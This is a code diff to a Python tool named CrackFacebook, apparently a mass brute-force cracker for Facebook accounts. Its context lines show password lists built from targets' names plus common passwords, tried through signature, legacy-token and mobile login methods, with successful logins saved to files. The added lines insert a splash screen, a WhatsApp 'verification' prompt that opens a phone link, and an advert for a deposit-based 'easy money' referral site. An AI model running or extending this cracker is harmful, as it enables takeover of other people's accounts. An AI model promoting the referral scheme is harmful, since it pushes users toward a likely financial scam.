@@ -10,6 +10,7 @@ import re
 import random
 import uuid
 import json
+import webbrowser
 import requests
 import datetime
 import hashlib
@@ -74,17 +75,84 @@ class CrackFacebook:
     def clear_screen(self):
         os.system("cls" if os.name == "nt" else "clear")
 
+    def pre_menu_splash(self):
+        self.clear_screen()
+        message = Text.from_markup(f"""
+[bold {CP_COLOR}]===>> SCRIPT INI GRATIS <<===[/bold {CP_COLOR}]
+
+[white]Script ini dibuat untuk tujuan edukasi dan keamanan.
+Harap gunakan dengan bijak dan bertanggung jawab.[/white]
+
+[{INFO_COLOR}]AUTHOR   :[/{INFO_COLOR}] [{TEXT_COLOR}]ACILL X CODE[/{TEXT_COLOR}]
+[{INFO_COLOR}]GITHUB   :[/{INFO_COLOR}] [underline]https://github.com/AciLNiBoss[/underline]
+
+[bold {OK_COLOR}]Follow & Star my Github for more updates![/bold {OK_COLOR}]
+""", justify="center")
+        console.print(Panel(message, title=f"[bold {BORDER_COLOR}]Welcome[/]", padding=(1, 2), border_style=BORDER_COLOR, box=box.ROUNDED), justify="center")
+        time.sleep(4)
+
+    def whatsapp_verification(self):
+        self.clear_screen()
+        whatsapp_number = "601131325432"
+        display_number = "+60 11-3132 5432"
+        whatsapp_link = f"https://wa.me/{whatsapp_number}"
+        
+        message = Text.from_markup(f"""
+[white]Mengarahkan Anda ke WhatsApp untuk verifikasi...[/white]
+
+Jika browser tidak terbuka otomatis, silakan hubungi nomor di bawah ini:
+[bold {OK_COLOR}]>> {display_number} <<[/bold {OK_COLOR}]
+
+Kirim pesan dengan format:
+[bold]IZIN_SCRIPT_ACILL[/bold]
+""", justify="center")
+
+        console.print(Panel(message, title=f"[bold {BORDER_COLOR}]Verifikasi Akses Pengguna[/]", padding=(2, 2), border_style=BORDER_COLOR, box=box.HEAVY), justify="center")
+        
+        try:
+            webbrowser.open(whatsapp_link)
+        except Exception:
+            console.print(f"[{ERROR_COLOR}]Gagal membuka browser secara otomatis.[/]")
+            
+        console.input(f"\n  [bold {INFO_COLOR}]Tekan [Enter] setelah Anda menghubungi Author untuk melanjutkan...[/]")
+
+    def show_sponsorship_message(self):
+        self.clear_screen()
+        link = "https://zona-cuan.vercel.app/register.html?ref=ZC-YLVCQL"
+        
+        message = Text.from_markup(f"""
+[bold]Jika ingin menghasilkan uang...[/bold]
+
+[bold {OK_COLOR}]✅ Misi gampang[/bold {OK_COLOR}]
+[bold {OK_COLOR}]✅ Bisa langsung di tarik[/bold {OK_COLOR}]
+[bold {OK_COLOR}]✅ Deposit hanya 50ribu[/bold {OK_COLOR}]
+
+[bold {CP_COLOR}]Cuan tiap hari, gas ni! Baru rilis![/bold {CP_COLOR}]
+
+[white]Daftar di sini:[/white]
+[cyan][underline]{link}[/underline][/cyan]
+
+[dim white]
+Harap Lakukan Riset Anda Sendiri (DYOR).
+Segala risiko ditanggung oleh pengguna.
+[/dim white]
+""", justify="center")
+        
+        console.print(Panel(message, title=f"[bold {BANNER_GRADIENT_1}]🔥 Peluang Cuan 🔥[/]", padding=(2, 2), border_style=BORDER_COLOR, box=box.ROUNDED), justify="center")
+        time.sleep(8)
+
+
     def banner(self):
-        console.print(Align.center(f"[bold gradient({BANNER_GRADIENT_1}) to {BANNER_GRADIENT_2}]ACL - MBF[/]"))
-
-        logo_text = Text("ACLL", justify="center", style=f"bold gradient({BANNER_GRADIENT_1}) to {BANNER_GRADIENT_2}")
-        slogan_text = Text("Precision │ Power │ Privacy", justify="center", style=f"italic {INFO_COLOR}")
-
-        combined_text = Text.assemble(logo_text, "\n\n", slogan_text)
+        quote_line1 = "In the digital shadows, we find clarity."
+        quote_line2 = "We don't just crack codes; we unlock possibilities."
+        
+        quote_text = Text.from_markup(f"{quote_line1}\n{quote_line2}", justify="center")
+        quote_text.stylize(f"bold italic gradient({BANNER_GRADIENT_2}) to {OK_COLOR}")
 
         console.print(
             Panel(
-                combined_text,
+                quote_text,
+                title=f"[bold gradient({BANNER_GRADIENT_1}) to {BANNER_GRADIENT_2}] ACL - MBF [/]",
                 width=60,
                 padding=(2, 2),
                 border_style=BORDER_COLOR,
@@ -94,13 +162,15 @@ class CrackFacebook:
         )
         console.print()
 
+        # [DIPERBAIKI ULANG] Menggunakan nesting tag yang benar untuk menghindari error
         info_panel = Panel.fit(
-            f"[bold {INFO_COLOR}]Author  :[/] [{TEXT_COLOR}]Acill (Dual API Edition)[/]\n"
-            f"[bold {INFO_COLOR}]Github  :[/] [{TEXT_COLOR}]github.com/acil-sadboy[/]\n"
-            f"[bold {INFO_COLOR}]Version :[/] [{TEXT_COLOR}]15.1 (Dual API Method)[/]",
+            f"[bold][{INFO_COLOR}]Author  :[/{INFO_COLOR}][/bold] [{TEXT_COLOR}]Acill (Sponsor Edition)[/{TEXT_COLOR}]\n"
+            f"[bold][{INFO_COLOR}]Github  :[/{INFO_COLOR}][/bold] [{TEXT_COLOR}]github.com/acil-sadboy[/{TEXT_COLOR}]\n"
+            f"[bold][{INFO_COLOR}]Version :[/{INFO_COLOR}][/bold] [{TEXT_COLOR}]15.8 (Final Markup Fix)[/{TEXT_COLOR}]",
             title=f"[bold {BORDER_COLOR}]Script Information[/]", border_style=BORDER_COLOR, box=box.ROUNDED
         )
         console.print(info_panel, justify="center")
+
 
     def check_internet(self, timeout=5):
         try:
@@ -109,6 +179,7 @@ class CrackFacebook:
         except requests.ConnectionError:
             return False
 
+    # ... Sisa kode dari sini ke bawah tetap sama dan tidak perlu diubah ...
     def handle_connection_lost(self, live, layout_func):
         self.status_message = f"[bold]{OK_COLOR}Koneksi terputus! Menunggu... ✈️[/]"
         live.update(layout_func())
@@ -469,7 +540,6 @@ class CrackFacebook:
         self.pilih_metode()
 
     def pilih_metode(self):
-        # [MODIFIED] Menu metode diperbarui dengan dua pilihan API
         self.clear_screen(); self.banner()
         metode_panel = (f"[bold]1[/]. B-Graph (Signature) [bold {OK_COLOR}]OPTIMIZED[/]\n"
                         f"[bold]2[/]. B-Graph (Token) [bold {CP_COLOR}]LEGACY[/]\n"
@@ -560,7 +630,6 @@ class CrackFacebook:
                     identifier, name = (user_data.split('|', 1) + [""])[:2] if '|' in user_data else (user_data, getattr(self, 'pwx_name', user_data))
                     password_list = self.generate_passwords(name) + self.pwx + ['bismillah', 'sayang', 'password', '123456']
 
-                    # [MODIFIED] Logika pemanggilan worker disesuaikan
                     if 'api_signature' in self.method: executor.submit(self._method_api_signature, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
                     if 'api_legacy' in self.method: executor.submit(self._method_api_legacy, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
                     if 'mobile' in self.method: executor.submit(self._method_mobile, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
@@ -591,7 +660,7 @@ class CrackFacebook:
         return layout
 
     def make_header(self):
-        return Panel(Text.from_markup(f"[bold {BANNER_GRADIENT_1}]ACLL[/] [white]- [bold {BANNER_GRADIENT_2}]CRACKER[/]"), style="bold", border_style=BORDER_COLOR, title="[bold]CRACKING DASHBOARD[/]", box=box.ROUNDED)
+        return Panel(Text.from_markup(f"[bold {BANNER_GRADIENT_1}]ACL - MBF[/] [white]- [bold {BANNER_GRADIENT_2}]CRACKER[/]"), style="bold", border_style=BORDER_COLOR, title="[bold]CRACKING DASHBOARD[/]", box=box.ROUNDED)
 
     def make_footer(self):
         elapsed_time = time.time() - self.start_time
@@ -673,7 +742,6 @@ class CrackFacebook:
         update_ui()
 
     def _method_api_legacy(self, identifier, pwx, task_id, progress, update_ui, ok_file, cp_file):
-        # [DIKEMBALIKAN] Metode API legacy menggunakan access token statis
         self.recent_targets.appendleft(identifier)
         for password in pwx:
             if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: break
@@ -794,7 +862,11 @@ class CrackFacebook:
 
 if __name__ == "__main__":
     try:
-        CrackFacebook().menu_utama()
+        cracker_instance = CrackFacebook()
+        cracker_instance.pre_menu_splash()
+        cracker_instance.whatsapp_verification()
+        cracker_instance.show_sponsorship_message()
+        cracker_instance.menu_utama()
     except KeyboardInterrupt:
         console.print("\n\n[bold yellow]Proses dihentikan pengguna.[/]")
     except Exception as e:
